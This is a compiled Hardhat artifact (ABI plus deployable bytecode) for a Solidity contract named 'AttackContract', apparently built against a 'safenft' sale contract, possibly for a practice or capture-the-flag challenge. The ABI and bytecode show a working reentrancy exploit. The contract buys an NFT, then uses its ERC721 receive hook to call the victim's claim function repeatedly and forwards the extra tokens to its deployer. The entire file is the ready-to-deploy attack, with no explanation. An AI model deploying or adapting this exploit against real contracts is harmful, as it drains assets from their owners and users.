{
  "_format": "hh-sol-artifact-1",
  "contractName": "AttackContract",
  "sourceName": "contracts/safenft.sol",
  "abi": [
    {
      "inputs": [
        {
          "internalType": "address",
          "name": "victimAddr",
          "type": "address"
        }
      ],
      "stateMutability": "nonpayable",
      "type": "constructor"
    },
    {
      "inputs": [],
      "name": "attackStepOne",
      "outputs": [],
      "stateMutability": "payable",
      "type": "function"
    },
    {
      "inputs": [],
      "name": "attackStepTwo",
      "outputs": [],
      "stateMutability": "nonpayable",
      "type": "function"
    },
    {
      "inputs": [
        {
          "internalType": "address",
          "name": "",
          "type": "address"
        },
        {
          "internalType": "address",
          "name": "",
          "type": "address"
        },
        {
          "internalType": "uint256",
          "name": "tokenId",
          "type": "uint256"
        },
        {
          "internalType": "bytes",
          "name": "",
          "type": "bytes"
        }
      ],
      "name": "onERC721Received",
      "outputs": [
        {
          "internalType": "bytes4",
          "name": "",
          "type": "bytes4"
        }
      ],
      "stateMutability": "nonpayable",
      "type": "function"
    }
  ],
  "bytecode": "0x608060405234801561001057600080fd5b50604051610835380380610835833981810160405281019061003291906100d6565b336000806101000a81548173ffffffffffffffffffffffffffffffffffffffff021916908373ffffffffffffffffffffffffffffffffffffffff16021790555080600160006101000a81548173ffffffffffffffffffffffffffffffffffffffff021916908373ffffffffffffffffffffffffffffffffffffffff160217905550600060028190555050610151565b6000815190506100d08161013a565b92915050565b6000602082840312156100ec576100eb610135565b5b60006100fa848285016100c1565b91505092915050565b600061010e82610115565b9050919050565b600073ffffffffffffffffffffffffffffffffffffffff82169050919050565b600080fd5b61014381610103565b811461014e57600080fd5b50565b6106d5806101606000396000f3fe6080604052600436106100345760003560e01c8063033125a514610039578063150b7a02146100505780635ebf1f941461008d575b600080fd5b34801561004557600080fd5b5061004e610097565b005b34801561005c57600080fd5b50610077600480360381019061007291906103a5565b61011b565b604051610084919061048c565b60405180910390f35b610095610286565b005b600160009054906101000a900473ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff16634e71d92d6040518163ffffffff1660e01b8152600401600060405180830381600087803b15801561010157600080fd5b505af1158015610115573d6000803e3d6000fd5b50505050565b60006005600254101561027457600160009054906101000a900473ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff166323b872dd3060008054906101000a900473ffffffffffffffffffffffffffffffffffffffff16866040518463ffffffff1660e01b81526004016101a793929190610455565b600060405180830381600087803b1580156101c157600080fd5b505af11580156101d5573d6000803e3d6000fd5b50505050600260008154809291906101ec906105a5565b9190505550600160009054906101000a900473ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff16634e71d92d6040518163ffffffff1660e01b8152600401600060405180830381600087803b15801561025b57600080fd5b505af115801561026f573d6000803e3d6000fd5b505050505b63150b7a0260e01b9050949350505050565b600160009054906101000a900473ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff1663bff29cee346040518263ffffffff1660e01b81526004016000604051808303818588803b1580156102f057600080fd5b505af1158015610304573d6000803e3d6000fd5b5050505050565b600061031e610319846104cc565b6104a7565b90508281526020810184848401111561033a57610339610651565b5b610345848285610565565b509392505050565b60008135905061035c81610671565b92915050565b600082601f8301126103775761037661064c565b5b813561038784826020860161030b565b91505092915050565b60008135905061039f81610688565b92915050565b600080600080608085870312156103bf576103be61065b565b5b60006103cd8782880161034d565b94505060206103de8782880161034d565b93505060406103ef87828801610390565b925050606085013567ffffffffffffffff8111156104105761040f610656565b5b61041c87828801610362565b91505092959194509250565b610431816104fd565b82525050565b6104408161050f565b82525050565b61044f8161055b565b82525050565b600060608201905061046a6000830186610428565b6104776020830185610428565b6104846040830184610446565b949350505050565b60006020820190506104a16000830184610437565b92915050565b60006104b16104c2565b90506104bd8282610574565b919050565b6000604051905090565b600067ffffffffffffffff8211156104e7576104e661061d565b5b6104f082610660565b9050602081019050919050565b60006105088261053b565b9050919050565b60007fffffffff0000000000000000000000000000000000000000000000000000000082169050919050565b600073ffffffffffffffffffffffffffffffffffffffff82169050919050565b6000819050919050565b82818337600083830152505050565b61057d82610660565b810181811067ffffffffffffffff8211171561059c5761059b61061d565b5b80604052505050565b60006105b08261055b565b91507fffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff8214156105e3576105e26105ee565b5b600182019050919050565b7f4e487b7100000000000000000000000000000000000000000000000000000000600052601160045260246000fd5b7f4e487b7100000000000000000000000000000000000000000000000000000000600052604160045260246000fd5b600080fd5b600080fd5b600080fd5b600080fd5b6000601f19601f8301169050919050565b61067a816104fd565b811461068557600080fd5b50565b6106918161055b565b811461069c57600080fd5b5056fea264697066735822122003a509c1234cf8c0060e6ca4a135528ad8365fcaa80441a2982f451ddbc3b24464736f6c63430008070033",
  "linkReferences": {},
  "deployedLinkReferences": {}
}